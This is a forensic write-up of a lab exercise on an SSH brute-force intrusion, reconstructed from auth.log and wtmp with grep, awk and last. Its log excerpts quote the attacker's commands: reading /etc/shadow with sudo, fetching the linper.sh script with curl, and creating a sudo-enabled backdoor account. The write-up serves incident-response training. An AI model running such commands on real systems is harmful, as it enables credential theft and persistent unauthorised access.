# Brutus

## Credit
Credit to ipag on YouTube. This investigation follows the same high-level workflow, and this writeup explains why each command is run and how the outputs connect.

## Scenario
A Confluence server was brute forced over SSH. Two artifacts are provided.

auth.log

wtmp

The goal is to confirm brute force, identify the compromised account, trace persistence, and document post-compromise actions.

## Why these artifacts
auth.log records authentication activity.

failed and successful SSH logins

sudo usage with full commands

user creation and privilege changes

This is the primary source for brute force, persistence, and escalation.

wtmp is the session ledger.

confirms when an interactive shell starts and ends

binary format so it must be read using last

auth.log tells you what was authenticated. wtmp tells you when someone was actually logged in. You need both for a reliable timeline.

## Field notes
auth.log format is timestamp, host, program PID, message. The program name is the fastest pivot.

sshd tracks access

useradd and usermod track persistence

sudo tracks commands

systemd-logind tracks sessions

utmpdump is verbose and noisy. last gives cleaner output.

## Timezone note
<div class="admonition"><strong>Forensic note:</strong> wtmp output uses your system timezone. Set TZ=utc so session times match auth.log and HTB answer format.</div>

## Investigation

### Step 1: Establish session context in wtmp
```
TZ=utc last -f wtmp
cyberjun pts/1        65.2.161.68      Wed Mar  6 06:37    gone - no logout
root     pts/1        65.2.161.68      Wed Mar  6 06:32 - 06:37  (00:04)
root     pts/0        203.101.190.9    Wed Mar  6 06:19    gone - no logout
reboot   system boot  6.2.0-1018-aws   Wed Mar  6 06:17   still running
root     pts/1        203.101.190.9    Sun Feb 11 10:54 - 11:08  (00:13)
root     pts/1        203.101.190.9    Sun Feb 11 10:41 - 10:41  (00:00)
root     pts/0        203.101.190.9    Sun Feb 11 10:33 - 11:08  (00:34)
root     pts/0        203.101.190.9    Thu Jan 25 11:15 - 12:34  (01:18)
ubuntu   pts/0        203.101.190.9    Thu Jan 25 11:13 - 11:15  (00:01)
reboot   system boot  6.2.0-1017-aws   Thu Jan 25 11:12 - 11:09 (16+23:57)

wtmp begins Thu Jan 25 11:12:17 2024
```
> Purpose: Set a baseline for who logged in, from where, and how long the sessions lasted.<br>
> Logic: Reads the wtmp session ledger in UTC so login windows are visible and comparable.<br>
> What this proves: An external IP has a short root session that needs explanation in auth.log.<br>
> Next: enumerate auth.log sources so later filtering is targeted.<br>

### Step 2: Identify event sources in auth.log
```
awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c
      1 chfn
    104 CRON
      3 groupadd
      1 passwd
    257 sshd
      6 sudo
      2 systemd
      8 systemd-logind
      1 useradd
      2 usermod
```
> Purpose: See which programs are writing to auth.log before filtering.<br>
> Logic: Extracts program names, normalizes them, then counts frequency.<br>
> What this proves: sshd, useradd, usermod, sudo, and systemd-logind are the key pivots.<br>
> Next: check for account creation events tied to persistence.<br>

### Step 3: Confirm persistence via account creation
```
grep useradd auth.log
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
```
> Purpose: Identify whether a new backdoor user was created.<br>
> Logic: Filters auth.log for useradd events that record new account creation.<br>
> What this proves: The attacker created cyberjunkie from an interactive terminal session.<br>
> Next: capture the exact UTC login window for the root session.<br>

### Step 4: Get exact interactive login times
```
TZ=utc last -f wtmp -F
cyberjun pts/1        65.2.161.68      Wed Mar  6 06:37:35 2024   gone - no logout
root     pts/1        65.2.161.68      Wed Mar  6 06:32:45 2024 - Wed Mar  6 06:37:24 2024  (00:04)
root     pts/0        203.101.190.9    Wed Mar  6 06:19:55 2024   gone - no logout
reboot   system boot  6.2.0-1018-aws   Wed Mar  6 06:17:15 2024   still running
root     pts/1        203.101.190.9    Sun Feb 11 10:54:27 2024 - Sun Feb 11 11:08:04 2024  (00:13)
root     pts/1        203.101.190.9    Sun Feb 11 10:41:11 2024 - Sun Feb 11 10:41:46 2024  (00:00)
root     pts/0        203.101.190.9    Sun Feb 11 10:33:49 2024 - Sun Feb 11 11:08:04 2024  (00:34)
root     pts/0        203.101.190.9    Thu Jan 25 11:15:40 2024 - Thu Jan 25 12:34:34 2024  (01:18)
ubuntu   pts/0        203.101.190.9    Thu Jan 25 11:13:58 2024 - Thu Jan 25 11:15:12 2024  (00:01)
reboot   system boot  6.2.0-1017-aws   Thu Jan 25 11:12:17 2024 - Sun Feb 11 11:09:18 2024 (16+23:57)

wtmp begins Thu Jan 25 11:12:17 2024
```
> Purpose: Pin the exact UTC login and logout time for the root session.<br>
> Logic: Uses full timestamps so session windows can be aligned to auth.log events.<br>
> What this proves: The root session started at 06:32:45 UTC and ended at 06:37:24 UTC.<br>
> Next: pivot into auth.log around 06:37 to see what closed the session.<br>

### Step 5: Pivot on a critical time window
```
grep 06:37 auth.log
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user roo
```
> Purpose: Capture session close, new login, and immediate post compromise actions.<br>
> Logic: Filters auth.log around the root session end time to surface related events.<br>
> What this proves: The attacker closed the root session and logged in as cyberjunkie, then used sudo.<br>
> Next: count IPs to isolate the brute force source.<br>

### Step 6: Identify brute force source IP
Includes host IP.
```
grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' auth.log | uniq -c | sort
      1 172.31.35.28
      1 203.101.190.9
    210 65.2.161.68
      4 65.2.161.68
```
> Purpose: Get a rough count of all IPs present in the log.<br>
> Logic: Extracts any IPv4 pattern, then counts frequency without removing host noise.<br>
> What this proves: One external IP appears far more often than the rest, but host IPs still appear.<br>
Message IPs only by matching a leading space.
```
grep -oP ' [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' auth.log | uniq -c | sort
      1  203.101.190.9
    165  65.2.161.68
```
> Purpose: Isolate only remote source IPs that appear in log messages.<br>
> Logic: Requires a leading space so host fields are excluded and only message IPs remain.<br>
> What this proves: 65.2.161.68 is the dominant external IP and the likely brute force source.<br>
> Next: confirm it generated repeated authentication failures.<br>

### Step 7: Prove brute force behavior
```
grep 65.2.161.68 auth.log | grep "Failed"
Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2335]: Failed password for invalid user admin from 65.2.161.68 port 46460 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2337]: Failed password for invalid user admin from 65.2.161.68 port 46498 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password for invalid user admin from 65.2.161.68 port 46454 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2338]: Failed password for invalid user backup from 65.2.161.68 port 46512 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2336]: Failed password for invalid user backup from 65.2.161.68 port 46468 ssh2
```
> Purpose: Show repeated login failures tied to the suspected IP.<br>
> Logic: Filters for the source IP and keeps only failed authentication lines.<br>
> What this proves: The IP attempted many invalid logins in a short window, consistent with brute force.<br>
> Next: confirm a successful login from the same IP.<br>

### Step 8: Confirm successful compromise
```
grep 65.2.161.68 auth.log | grep -A3 "Accepted"
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Received disconnect from 65.2.161.68 port 46698:11: Bye Bye [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Disconnected from invalid user server_adm 65.2.161.68 port 46698 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Received disconnect from 65.2.161.68 port 46710:11: Bye Bye [preauth]
--
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```
> Purpose: Link the brute force source to a successful root login.<br>
> Logic: Filters for accepted authentication lines from the same IP, including nearby context.<br>
> What this proves: A successful root login followed repeated failures and closed quickly, which fits automated brute force and not a normal interactive login.<br>
> Next: map the root login to its session number in systemd logind.<br>

### Step 9: Correlate authentication to session ID
```
grep systemd-logind auth.log
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
```
> Purpose: Tie the root authentication to its session ID.<br>
> Logic: Filters for systemd-logind events that record session creation and removal.<br>
> What this proves: The attacker session ID for root is 37.<br>
> Next: confirm how the new account was given admin privileges.<br>

### Step 10: Confirm privilege escalation
```
grep usermod auth.log
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```
> Purpose: Verify how the persistence account gained elevated rights.<br>
> Logic: Filters for usermod events that change group membership.<br>
> What this proves: cyberjunkie was added to sudo, granting administrative access.<br>
> Next: extract the exact commands run with sudo.<br>

### Step 11: Identify attacker commands
```
grep sudo auth.log
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
```
> Purpose: Recover the exact post compromise commands executed with sudo.<br>
> Logic: Filters sudo audit lines that include the full command string.<br>
> What this proves: The attacker accessed /etc/shadow and downloaded linper.sh via curl.<br>
> Next: summarize the findings, timeline, and MITRE mappings.<br>

## Findings and indicators

| Type | Value | Context |
| --- | --- | --- |
| Attacker IP | 65.2.161.68 | Source of brute force attempts |
| Compromised user | root | Account successfully accessed |
| Persistence user | cyberjunkie | Rogue account created by attacker, UID 1002 |
| Malicious file | linper.sh | Enumeration script fetched with curl |
| Initial login | 2024-03-06 06:32:45 UTC | Interactive session start in wtmp |

## Forensic timeline UTC

| Timestamp | Event | Technical detail |
| --- | --- | --- |
| 06:31:33 | Brute force | Failed logins from 65.2.161.68 |
| 06:32:44 | Compromise | Accepted password for root |
| 06:32:45 | Interactive session | Root session starts in wtmp |
| 06:34:18 | Persistence | useradd creates cyberjunkie |
| 06:35:15 | Privilege change | usermod adds cyberjunkie to sudo |
| 06:37:24 | Session end | Session 37 ends for root |
| 06:37:34 | Backdoor login | cyberjunkie login from 65.2.161.68 |
| 06:37:57 | Credential access | sudo cat /etc/shadow |
| 06:39:38 | Tool transfer | sudo curl downloads linper.sh |

## MITRE ATT&CK mapping

| Technique | Summary |
| --- | --- |
| T1136.001 | Create Account for persistence |
| T1098 | Account Manipulation via sudo group membership |
| T1105 | Ingress Tool Transfer via curl |
